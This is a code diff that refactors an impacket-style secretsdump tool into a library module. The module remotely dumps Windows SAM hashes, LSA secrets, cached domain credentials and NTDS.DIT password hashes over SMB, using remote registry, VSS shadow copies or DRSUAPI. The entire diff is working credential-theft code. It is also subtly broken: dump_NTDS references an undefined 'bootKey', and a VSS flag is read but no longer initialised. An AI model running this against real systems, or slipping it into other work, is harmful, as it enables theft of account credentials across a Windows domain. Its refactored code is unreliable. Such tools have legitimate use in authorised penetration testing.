@@ -47,18 +47,18 @@ from struct import unpack, pack
 from collections import OrderedDict
 from binascii import unhexlify, hexlify
 from datetime import datetime
+from gevent import sleep
 import sys
 import random
 import hashlib
 import argparse
 import logging
 import ntpath
-import time
 import string
 import codecs
 import os
 
-from impacket.examples import logger
+from core.logger import *
 from impacket import version, winregistry, ntlm
 from impacket.smbconnection import SMBConnection
 from impacket.dcerpc.v5 import transport, rrp, scmr, wkst, samr, epm, drsuapi
@@ -69,13 +69,8 @@ from impacket.nt_errors import STATUS_MORE_ENTRIES
 from impacket.ese import ESENT_DB
 from impacket.dcerpc.v5.dtypes import NULL
 
-try:
-    from Crypto.Cipher import DES, ARC4, AES
-    from Crypto.Hash import HMAC, MD4
-except ImportError:
-    logging.critical("Warning: You don't have any crypto installed. You need PyCrypto")
-    logging.critical("See http://www.pycrypto.org/")
-
+from Crypto.Cipher import DES, ARC4, AES
+from Crypto.Hash import HMAC, MD4
 
 # Structures
 # Taken from http://insecurety.net/?p=768
@@ -529,7 +524,7 @@ class RemoteOperations:
                 scmr.hRChangeServiceConfigW(self.__scmr, self.__serviceHandle, dwStartType = 0x3)
             logging.info('Starting service %s' % self.__serviceName)
             scmr.hRStartServiceW(self.__scmr,self.__serviceHandle)
-            time.sleep(1)
+            sleep(1)
 
     def enableRegistry(self):
         self.__connectSvcCtl()
@@ -672,7 +667,7 @@ class RemoteOperations:
 
     def __getLastVSS(self):
         self.__executeRemote('%COMSPEC% /C vssadmin list shadows')
-        time.sleep(5)
+        sleep(5)
         tries = 0
         while True:
             try:
@@ -684,7 +679,7 @@ class RemoteOperations:
                     raise Exception('Too many tries trying to list vss shadows')
                 if str(e).find('SHARING') > 0:
                     # Stuff didn't finish yet.. wait more
-                    time.sleep(5)
+                    sleep(5)
                     tries +=1
                     pass
                 else:
@@ -937,7 +932,7 @@ class SAMHashes(OfflineRegistry):
 
             answer =  "%s:%d:%s:%s:::" % (userName, rid, hexlify(lmHash), hexlify(ntHash))
             self.__itemsFound[rid] = answer
-            print answer
+            print_att(answer)
 
     def export(self, fileName):
         if len(self.__itemsFound) > 0:
@@ -1113,7 +1108,7 @@ class LSASecrets(OfflineRegistry):
                 domainLong = plainText[:self.__pad(record['FullDomainLength'])].decode('utf-16le')
                 answer = "%s:%s:%s:%s:::" % (userName, hexlify(encHash), domainLong, domain)
                 self.__cachedItems.append(answer)
-                print answer
+                print_att(answer)
 
     def __printSecret(self, name, secretItem):
         # Based on [MS-LSAD] section 3.1.1.4
@@ -1191,12 +1186,12 @@ class LSASecrets(OfflineRegistry):
                 secret = "$MACHINE.ACC: %s:%s" % (hexlify(ntlm.LMOWFv1('','')), hexlify(md4.digest()))
 
         if secret != '':
-            print secret
+            print_att(secret)
             self.__secretItems.append(secret)
         else:
             # Default print, hexdump
             self.__secretItems.append('%s:%s' % (name, hexlify(secretItem)))
-            hexdump(secretItem)
+            print_att("{}:{}".format(name, hexlify(secretItem)))
 
     def dumpSecrets(self):
         if self.__securityFile is None:
@@ -1926,43 +1921,34 @@ class NTDSHashes:
 
 
 class DumpSecrets:
-    def __init__(self, address, username='', password='', domain='', options=None):
-        self.__useVSSMethod = options.use_vss
+    def __init__(self, address, port, outputFile, smbConnection, kerberos=False):
         self.__remoteAddr = address
-        self.__username = username
-        self.__password = password
-        self.__domain = domain
-        self.__lmhash = ''
-        self.__nthash = ''
-        self.__aesKey = options.aesKey
-        self.__smbConnection = None
+        self.__remotePort = port
+        #self.__username = username
+        #self.__password = password
+        #self.__domain = domain
+        self.__bootKey = None
+        #self.__lmhash = ''
+        #self.__nthash = ''
+        #self.__aesKey = aesKey
+        self.__smbConnection = smbConnection
         self.__remoteOps = None
         self.__SAMHashes = None
         self.__NTDSHashes = None
         self.__LSASecrets = None
-        self.__systemHive = options.system
-        self.__securityHive = options.security
-        self.__samHive = options.sam
-        self.__ntdsFile = options.ntds
-        self.__history = options.history
+        self.__systemHive = None #Local
+        self.__securityHive = None #Local
+        self.__samHive = None #Local
+        self.__ntdsFile = None #Local
+        self.__history = False #Might want to expose this
         self.__noLMHash = True
         self.__isRemote = True
-        self.__outputFileName = options.outputfile
-        self.__doKerberos = options.k
-        self.__justDC = options.just_dc
-        self.__justDCNTLM = options.just_dc_ntlm
-        self.__pwdLastSet = options.pwd_last_set
-        self.__resumeFileName = options.resumefile
-
-        if options.hashes is not None:
-            self.__lmhash, self.__nthash = options.hashes.split(':')
-
-    def connect(self):
-        self.__smbConnection = SMBConnection(self.__remoteAddr, self.__remoteAddr)
-        if self.__doKerberos:
-            self.__smbConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash, self.__aesKey)
-        else:
-            self.__smbConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
+        self.__outputFileName = outputFile
+        self.__doKerberos = kerberos
+        self.__justDC = False #Might want to expose this
+        self.__justDCNTLM = False #Might want to expose this
+        self.__pwdLastSet = False #Might want to expose this
+        self.__resumeFileName = None #Might want to expose this
 
     def getBootKey(self):
         # Local Version whenever we are given the files directly
@@ -2009,106 +1995,67 @@ class DumpSecrets:
         logging.debug('LMHashes are NOT being stored')
         return True
 
-    def dump(self):
-        try:
-            if self.__remoteAddr.upper() == 'LOCAL' and self.__username == '':
-                self.__isRemote = False
-                self.__useVSSMethod = True
-                bootKey = self.getBootKey()
-                if self.__ntdsFile is not None:
-                    # Let's grab target's configuration about LM Hashes storage
-                    self.__noLMHash = self.checkNoLMHashPolicy()
-            else:
-                self.__isRemote = True
-                bootKey = None
-                try:
-                    self.connect()
-                    self.__remoteOps  = RemoteOperations(self.__smbConnection, self.__doKerberos)
-                    if self.__justDC is False and self.__justDCNTLM is False or self.__useVSSMethod is True:
-                        self.__remoteOps.enableRegistry()
-                        bootKey             = self.__remoteOps.getBootKey()
-                        # Let's check whether target system stores LM Hashes
-                        self.__noLMHash = self.__remoteOps.checkNoLMHashPolicy()
-                except Exception, e:
-                    logging.error('RemoteOperations failed: %s' % str(e))
-                else:
-                    # If RemoteOperations succeeded, then we can extract SAM and LSA
-                    if self.__justDC is False and self.__justDCNTLM is False:
-                        try:
-                            if self.__isRemote is True:
-                                SAMFileName         = self.__remoteOps.saveSAM()
-                            else:
-                                SAMFileName         = self.__samHive
+    def do_remote_ops(self):
+        bootKey = None
+        #self.connect()
+        self.__remoteOps  = RemoteOperations(self.__smbConnection, self.__doKerberos)
+        if self.__justDC is False and self.__justDCNTLM is False or self.__useVSSMethod is True:
+            self.__remoteOps.enableRegistry()
+            bootKey = self.__remoteOps.getBootKey()
+            # Let's check whether target system stores LM Hashes
+            self.__noLMHash = self.__remoteOps.checkNoLMHashPolicy()
 
-                            self.__SAMHashes    = SAMHashes(SAMFileName, bootKey, isRemote = self.__isRemote)
-                            self.__SAMHashes.dump()
-                            if self.__outputFileName is not None:
-                                self.__SAMHashes.export(self.__outputFileName)
-                        except Exception, e:
-                            logging.error('SAM hashes extraction failed: %s' % str(e))
+        self.__bootKey = bootKey
 
-                        try:
-                            if self.__isRemote is True:
-                                SECURITYFileName = self.__remoteOps.saveSECURITY()
-                            else:
-                                SECURITYFileName = self.__securityHive
-
-                            self.__LSASecrets = LSASecrets(SECURITYFileName, bootKey, self.__remoteOps, isRemote=self.__isRemote)
-                            self.__LSASecrets.dumpCachedHashes()
-                            if self.__outputFileName is not None:
-                                self.__LSASecrets.exportCached(self.__outputFileName)
-                            self.__LSASecrets.dumpSecrets()
-                            if self.__outputFileName is not None:
-                                self.__LSASecrets.exportSecrets(self.__outputFileName)
-                        except Exception, e:
-                            logging.error('LSA hashes extraction failed: %s' % str(e))
-
-            # NTDS Extraction we can try regardless of RemoteOperations failing. It might still work
-            if self.__isRemote is True:
-                if self.__useVSSMethod:
-                    NTDSFileName = self.__remoteOps.saveNTDS()
-                else:
-                    NTDSFileName = None
-            else:
-                NTDSFileName = self.__ntdsFile
-
-            self.__NTDSHashes = NTDSHashes(NTDSFileName, bootKey, isRemote=self.__isRemote, history=self.__history,
-                                           noLMHash=self.__noLMHash, remoteOps=self.__remoteOps,
-                                           useVSSMethod=self.__useVSSMethod, justNTLM=self.__justDCNTLM,
-                                           pwdLastSet=self.__pwdLastSet, resumeSession=self.__resumeFileName,
-                                           outputFileName=self.__outputFileName)
+    def dump_SAM(self):
+        # If RemoteOperations succeeded, then we can extract SAM
+        if self.__bootKey is not None:
             try:
-                self.__NTDSHashes.dump()
+                SAMFileName = self.__remoteOps.saveSAM()
+                self.__SAMHashes = SAMHashes(SAMFileName, self.__bootKey, isRemote = True)
+                print_succ('{}:{} Dumping SAM hashes (uid:rid:lmhash:nthash):'.format(self.__remoteAddr, self.__remotePort))
+                self.__SAMHashes.dump()
+                if self.__outputFileName is not None:
+                    self.__SAMHashes.export(self.__outputFileName)
             except Exception, e:
-                logging.error(e)
-                if self.__useVSSMethod is False:
-                    logging.info('Something wen\'t wrong with the DRSUAPI approach. Try again with -use-vss parameter')
-            self.cleanup()
-        except (Exception, KeyboardInterrupt), e:
-            #import traceback
-            #print traceback.print_exc()
-            logging.error(e)
-            if self.__NTDSHashes is not None:
-                if isinstance(e, KeyboardInterrupt):
-                    while True:
-                        answer =  raw_input("Delete resume session file? [y/N] ")
-                        if answer.upper() == '':
-                            answer = 'N'
-                            break
-                        elif answer.upper() == 'Y':
-                            answer = 'Y'
-                            break
-                        elif answer.upper() == 'N':
-                            answer = 'N'
-                            break
-                    if answer == 'Y':
-                        resumeFile = self.__NTDSHashes.getResumeSessionFile()
-                        if resumeFile is not None:
-                            os.unlink(resumeFile)
+                logging.error('SAM hashes extraction failed: %s' % str(e))
+
+    def dump_LSA(self):
+        # If RemoteOperations succeeded, then we can extract LSA
+        if self.__bootKey is not None:
             try:
-                self.cleanup()
-            except:
-                pass
+                SECURITYFileName = self.__remoteOps.saveSECURITY()
+                print_succ('{}:{} Dumping LSA secrets:'.format(self.__remoteAddr, self.__remotePort))
+                self.__LSASecrets = LSASecrets(SECURITYFileName, self.__bootKey, self.__remoteOps, isRemote=True)
+                self.__LSASecrets.dumpCachedHashes()
+                if self.__outputFileName is not None:
+                    self.__LSASecrets.exportCached(self.__outputFileName)
+                self.__LSASecrets.dumpSecrets()
+                if self.__outputFileName is not None:
+                    self.__LSASecrets.exportSecrets(self.__outputFileName)
+            except Exception, e:
+                logging.error('LSA hashes extraction failed: %s' % str(e))
+
+    def dump_NTDS(self, method):
+        # NTDS Extraction we can try regardless of RemoteOperations failing. It might still work
+        vss = False
+        if method == 'vss':
+            vss = True
+            NTDSFileName = self.__remoteOps.saveNTDS()
+        else:
+            NTDSFileName = None
+
+        self.__NTDSHashes = NTDSHashes(NTDSFileName, bootKey, isRemote=True, history=self.__history,
+                                       noLMHash=self.__noLMHash, remoteOps=self.__remoteOps,
+                                       useVSSMethod=vss, justNTLM=self.__justDCNTLM,
+                                       pwdLastSet=self.__pwdLastSet, resumeSession=self.__resumeFileName,
+                                       outputFileName=self.__outputFileName)
+        try:
+            self.__NTDSHashes.dump()
+        except Exception, e:
+            logging.error(e)
+            if method != 'vss':
+                logging.info('Something wen\'t wrong with the DRSUAPI approach. Try again with -use-vss parameter')
 
     def cleanup(self):
         logging.info('Cleaning up... ')
@@ -2120,91 +2067,3 @@ class DumpSecrets:
             self.__LSASecrets.finish()
         if self.__NTDSHashes:
             self.__NTDSHashes.finish()
-        if self.__isRemote is True:
-            self.__smbConnection.logoff()
-
-
-# Process command-line arguments.
-if __name__ == '__main__':
-    # Init the example's logger theme
-    logger.init()
-    # Explicitly changing the stdout encoding format
-    if sys.stdout.encoding is None:
-        # Output is redirected to a file
-        sys.stdout = codecs.getwriter('utf8')(sys.stdout)
-
-    print version.BANNER
-
-    parser = argparse.ArgumentParser(add_help = True, description = "Performs various techniques to dump secrets from the remote machine without executing any agent there.")
-
-    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address> or LOCAL (if you want to parse local files)')
-    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
-    parser.add_argument('-system', action='store', help='SYSTEM hive to parse')
-    parser.add_argument('-security', action='store', help='SECURITY hive to parse')
-    parser.add_argument('-sam', action='store', help='SAM hive to parse')
-    parser.add_argument('-ntds', action='store', help='NTDS.DIT file to parse')
-    parser.add_argument('-resumefile', action='store', help='resume file name to resume NTDS.DIT session dump (only available to DRSUAPI approach). This file will also be used to keep updating the session\'s state')
-    parser.add_argument('-outputfile', action='store',
-                        help='base output filename. Extensions will be added for sam, secrets, cached and ntds')
-    parser.add_argument('-use-vss', action='store_true', default=False,
-                        help='Use the VSS method insead of default DRSUAPI')
-    group = parser.add_argument_group('display options')
-    group.add_argument('-just-dc', action='store_true', default=False,
-                        help='Extract only NTDS.DIT data (NTLM hashes and Kerberos keys)')
-    group.add_argument('-just-dc-ntlm', action='store_true', default=False,
-                       help='Extract only NTDS.DIT data (NTLM hashes only)')
-    group.add_argument('-pwd-last-set', action='store_true', default=False,
-                        help='Shows pwdLastSet attribute for each NTDS.DIT account. Doesn\'t apply to -outputfile data')
-    group.add_argument('-history', action='store_true', help='Dump password history')
-    group = parser.add_argument_group('authentication')
-
-    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
-    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
-    group.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line')
-    group.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication (128 or 256 bits)')
-
-    if len(sys.argv)==1:
-        parser.print_help()
-        sys.exit(1)
-
-    options = parser.parse_args()
-
-    if options.debug is True:
-        logging.getLogger().setLevel(logging.DEBUG)
-    else:
-        logging.getLogger().setLevel(logging.INFO)
-
-    import re
-
-    domain, username, password, address = re.compile('(?:(?:([^/@:]*)/)?([^@:]*)(?::([^@]*))?@)?(.*)').match(
-        options.target).groups('')
-
-    if options.use_vss is True and options.resumefile is not None:
-        logging.error('resuming a previous NTDS.DIT dump session is not supported in VSS mode')
-        sys.exit(1)
-
-    if address.upper() == 'LOCAL' and username == '' and options.resumefile is not None:
-        logging.error('resuming a previous NTDS.DIT dump session is not supported in VSS mode')
-        sys.exit(1)
-
-    if address.upper() == 'LOCAL' and username == '':
-        if options.system is None:
-            logging.error('SYSTEM hive is always required for local parsing, check help')
-            sys.exit(1)
-    else:
-
-        if domain is None:
-            domain = ''
-
-        if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
-            from getpass import getpass
-            password = getpass("Password:")
-
-        if options.aesKey is not None:
-            options.k = True
-
-    dumper = DumpSecrets(address, username, password, domain, options)
-    try:
-        dumper.dump()
-    except Exception, e:
-        logging.error(e)
